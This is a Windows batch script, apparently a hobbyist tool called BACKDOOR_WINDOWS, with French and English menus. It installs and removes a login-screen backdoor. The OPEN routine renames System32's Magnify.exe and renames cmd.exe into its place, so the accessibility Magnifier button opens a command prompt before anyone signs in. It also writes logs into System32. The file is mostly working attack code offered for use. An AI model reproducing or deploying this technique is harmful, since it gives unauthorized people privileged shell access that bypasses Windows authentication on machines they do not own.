rem ********************************************************************************
rem DEBUT DU SCRIPT 
rem BACKDOOR_WINDOWS
rem LE : 13/12/2022 
rem PROGRAMME PRODUIT PAR SCION-545926/DIGYSKY
rem LICENCE OPEN SOURCE 
rem VERSION 1.1.3
rem ********************************************************************************
@echo off
cls
title BACKDOOR_WINDOWS
set vers=1.1.3
if exist "BACKDOOR_WINDOWS_%vers%_log.txt" goto demaragee
if not exist "BACKDOOR_WINDOWS_%vers%_log.txt" goto creat

:creat
(
echo **********************************
echo BACKDOOR_WINDOWS VERSION : %vers%.
echo PROGRAMME PRODUIT PAR SCION-545926
echo LICENCE OPEN SOURCE 
echo 2 cmd et magnify sont présent !
echo 3 cmd present, magnify manquant !
echo 4 magnify present, cmd manquant !
echo 5 magnify et cmd non present !
echo **********************************
) >> BACKDOOR_WINDOWS_%vers%_log.txt

:demaragee
(
echo *******************************************************************************************
echo.
echo [%date%] a [%time%] DEMARGAE PAR %USERNAME% SUR LE PC %USERDOMAIN% DE "BACKDOOR_WINDOWS" VERSION : %vers%.
echo.
) >> BACKDOOR_WINDOWS_%vers%_log.txt

CLS
COLOR 1A
mode con cols=60 lines=20
	echo ---------------------------------------
	echo.
	ECHO           BACKDOOR_WINDOWS
	echo.
	ECHO.
	echo PROGRAM PRODUCED BY SCION-545926
	ECHO CREATE THE : 13/12/2022
	ECHO OPEN SOURCE LICENSE
	echo VERSION : 1.1.3
	ECHO.
	ECHO.
	echo ---------------------------------------

TIMEOUT /T 7 /NOBREAK
rem --------------------------------------
rem 	DECLARATION DES VARIABLE
	set errorlevel=0
	set errmsg=0
	set door=0
	set system=0
	set choice=0
	set copym=0
	set copyc=0
rem --------------------------------------

rem --------------------------------------
rem 	VERIFICATION DES DONNEES
cls
mode con cols=120 lines=15
color f1
	echo CHECKING FILES :
	
	echo.
	rem MSGBOX.EXE
		if exist "%cd%\MSGBOX.EXE" echo MSGBOX.EXE : OK
		if not exist "%cd%\MSGBOX.EXE" set errmsg=1
		if not exist "%cd%\MSGBOX.EXE" echo MSGBOX.EXE : ERREUR !
		
	rem DOSSIER OPEN
	ECHO DOSSIER OPEN :
		if exist "%cd%\Open\Magnify.exe" set /a dor+=1
		if not exist "%cd%\Open\Magnify.exe" set /a dor+=2
		
		if exist "%cd%\Open\cmd.exe" set /a dor+=1
		if not exist "%cd%\Open\cmd.exe" set /a dor+=3
		
		if "%dor%"=="2" echo cmd et magnify sont present !
		if "%dor%"=="3" echo cmd present, magnify manquant !
		if "%dor%"=="4" echo magnify present, cmd manquant !
		if "%dor%"=="5" echo magnify et cmd non present !
(
echo [%date%] a [%time%] Retour check DOSSIER OPEN : %dor%. 
) >> BACKDOOR_WINDOWS_%vers%_log.txt

	rem SYSTEM32
	
	ECHO DOSSIER SYSTEM32 :
		if exist "C:\Windows\System32\Magnify.exe" set /a system+=1
		if not exist "C:\Windows\System32\Magnify.exe" set /a system+=2
		
		if exist "C:\Windows\System32\cmd.exe" set /a system+=1
		if not exist "C:\Windows\System32\cmd.exe" set /a system+=3
		
		if "%system%"=="2" echo cmd et magnify sont present !
		if "%system%"=="3" echo cmd present, magnify manquant !
		if "%system%"=="4" echo magnify present, cmd manquant !
		if "%system%"=="5" echo magnify et cmd non present !
(
echo [%date%] a [%time%] Retour check SYSTEM32 : %system%. 
) >> BACKDOOR_WINDOWS_%vers%_log.txt
	pause
	
rem --------------------------------------

rem --------------------------------------
rem 				ERREUR

:err
cls
color ca
mode con cols=120 lines=50
	if "%errmsg%"=="1" goto err1
	if "%errcmd%"=="1" goto err2
	goto menu

	:err1
	(
	echo [%date%] a [%time%] Le fichier MSGBOX.EXE est introuvable !
	echo.
	) >> BACKDOOR_WINDOWS_%vers%_log.txt
	cls
	echo.
	echo Alerte un fichier primordiale au fonctionnement du programme est manquant !
	echo.
	echo Le programme ne pourra pas continuer son execution sans ce dernie !
	echo.
	pause 
	goto FIN
	
	:err2
	(
	echo [%date%] a [%time%] Le fichier cmd.exe est introuvable !
	echo.
	) >> BACKDOOR_WINDOWS_%vers%_log.txt
	
	cls
	echo.
	echo Alerte le fichier cmd.exe est manquant !
	echo.
	echo Le programme ne pourra pas continuer son execution sans ce dernie !
	echo.
	.\MSGBOX.EXE "Alerte le fichier cmd.exe est manquant !" "BACKDOOR_WINDOWS" OK
	goto FIN

rem --------------------------------------

rem --------------------------------------
rem 				MENU

:menu
CLS
COLOR 1A
mode con cols=60 lines=20
	echo ---------------------------------------
	echo.
	ECHO           BACKDOOR_WINDOWS
	echo.
	ECHO.
	echo PROGRAM PRODUCED BY SCION-545926
	ECHO CREATE THE : 13/12/2022
	ECHO OPEN SOURCE LICENSE
	ECHO.
	ECHO.
	echo ---------------------------------------
	echo.
	echo.
	echo This program allows you to implement a command prompt before opening a windows session. 
	echo This hidden door will be in the accessibility section: magnifying glass.
	echo.
	echo Ce programme vous permet d'implémenter une invite de commande avant l ouvrir une session Windows.
	echo Cette porte derober se trouvera dans la section accessibilite : loupe.
	
	.\MSGBOX.EXE "CAUTION THIS PROGRAM CAN ONLY BE RUN ON A PORTABLE WINDOWS SYSTEM TYPE: MINI WINDOWS" "BACKDOOR_WINDOWS" OKCANCEL
	if errorlevel 1 goto OK
	if errorlevel 2 goto FIN
	goto FIN
	
	:OK
	.\MSGBOX.EXE "OPEN OR CLOSE? \nYES : open the door \nNO : close the door \nCANCEL : exit" "BACKDOOR_WINDOWS" YESNOCANCEL
	if errorlevel 7 goto CLOSE
	if errorlevel 6 goto OPEN
	if errorlevel 2 goto FIN
	exit
rem --------------------------------------

	rem --------------------------------------
	rem 				OPEN
	:OPEN
		
		.\MSGBOX.EXE "DO YOU REALLY WANT TO ACTIVATE THE STOLEN DOOR?" "BACKDOOR_WINDOWS" YESNO
		if errorlevel 7 goto menu
		if errorlevel 6 goto YES
		
		:YES

		if exist "C:\Windows\System32\Magnify.exe" set /a copym+=1
		if exist "C:\Windows\System32\cmd.exe" set /a copyc+=1
		if not exist "C:\Windows\System32\cmd.exe" set /a errcmd+=1
		if "%errcmd%"=="1" goto err
		
		if "%copym%"=="1" copy "C:\Windows\System32\Magnify.exe" "%cd%\Open"
		if "%copyc%"=="1" copy "C:\Windows\System32\cmd.exe" "%cd%\Open"
		if exist "%cd%\open\Magnify.exe" (echo [%date%] a [%time%] Magnify.exe copier. >> BACKDOOR_WINDOWS_%vers%_log.txt)
		if exist "%cd%\open\cmd.exe" (echo [%date%] a [%time%] cmd.exe copier. >> BACKDOOR_WINDOWS_%vers%_log.txt)
		
		if "%copym%"=="1" rename C:\Windows\System32\Magnify.exe Magnify1.exe
		if "%copyc%"=="1" rename C:\Windows\System32\cmd.exe Magnify.exe
		
		rem LOG
		
		.\MSGBOX.EXE "Voulez vous inscrir les logs sur le pc cible" "BACKDOOR_WINDOWS" YESNO
		if errorlevel 7 goto openterm
		if errorlevel 6 goto logopen
		:logopen
			(
			echo [%date%] a [%time%] Porte ouverte.
			echo.
			) >> C:\Windows\System32\BACKDOOR_WINDOWS_%vers%_log.txt
			
			:openterm
			(
			echo [%date%] a [%time%] Porte ouverte.
			echo.
			) >> BACKDOOR_WINDOWS_%vers%_log.txt
			.\MSGBOX.EXE "Porte ouverte ;)" "BACKDOOR_WINDOWS"
			goto FIN
		
	rem --------------------------------------

	rem --------------------------------------
	rem 				CLOSE
	:CLOSE
		
		if exist "C:\Windows\System32\Magnify1.exe" goto zero
		if not exist "C:\Windows\System32\Magnify1.exe" goto fait
		
			:zero 
			rename C:\Windows\System32\Magnify.exe cmd.exe
			rename C:\Windows\System32\Magnify1.exe Magnify.exe
			
			:fait
			.\MSGBOX.EXE "Voulez vous inscrir les logs sur le pc cible" "BACKDOOR_WINDOWS" YESNO
			if errorlevel 7 goto closeterm
			if errorlevel 6 goto logclose
			:logclose
			(
			echo [%date%] a [%time%] Porte fermer.
			echo.
			) >> C:\Windows\System32\BACKDOOR_WINDOWS_%vers%_log.txt
			
			:closeterm
			(
			echo [%date%] a [%time%] Porte fermer.
			echo.
			) >> BACKDOOR_WINDOWS_%vers%_log.txt
			.\MSGBOX.EXE "Porte fermer ;)" "BACKDOOR_WINDOWS"
			goto FIN
		
	rem --------------------------------------
	
	:FIN
	cls
	color f1
	mode con cols=40 lines=10
	echo Programme terminer 
	echo Voir les logs, 1
	echo Supprimer les logs, 2
	echo Quitter, 3
	echo Retourner au menu, 4
	
	set /p choice=
	
	if "%choice%"=="1" goto logs
	if "%choice%"=="2" goto sup
	if "%choice%"=="3" goto quit
	if "%choice%"=="4" goto menu
	
	:logs
	cls 
	color 0a
	mode con cols=140 lines=50
	echo.
	if exist "C:\Windows\System32\BACKDOOR_WINDOWS_log_system32.txt" more C:\Windows\System32\BACKDOOR_WINDOWS_log_system32.txt
	if not exist "C:\Windows\System32\BACKDOOR_WINDOWS_log_system32.txt" echo No logs
	pause 
	goto FIN 
	
	:sup
	cls 
	color 0a
	mode con cols=140 lines=50
	echo.
	if exist "C:\Windows\System32\BACKDOOR_WINDOWS_log_system32.txt" del C:\Windows\System32\BACKDOOR_WINDOWS_log_system32.txt
	if not exist "C:\Windows\System32\BACKDOOR_WINDOWS_log_system32.txt" echo No logs
	pause
	goto FIN
	
	:quit
	(
	echo.
	echo [%date%] a [%time%] ARRET BACKDOOR_WINDOWS VERSION : %vers%.
	echo.
	echo *******************************************************************************************
	) >> BACKDOOR_WINDOWS_%vers%_log.txt
	set errmsg=
	set door=
	set system=
	set choice=
	set copym=
	set copyc=
	set vers=
	exit
	
rem ******************************************************************************** 
rem LE : 13/12/2022 
rem PROGRAMME PRODUIT PAR SCION-545926/DIGYSKY
rem LICENCE OPEN SOURCE 
rem VERSION 1.1.3
rem FIN DU SCRIPT
rem ********************************************************************************
